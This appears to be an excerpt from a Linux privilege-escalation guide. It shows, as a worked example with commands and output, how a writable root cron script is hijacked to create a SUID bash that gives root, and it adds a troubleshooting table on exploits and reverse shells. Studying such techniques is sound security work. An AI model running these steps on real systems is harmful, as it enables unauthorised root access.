# Example 3: Cron Job Script Hijacking

**Scenario**: Root cron job executes writable script

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh

# Wait 1 minute
$ /tmp/bash -p
# id
uid=1000(user) gid=1000(user) euid=0(root)
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |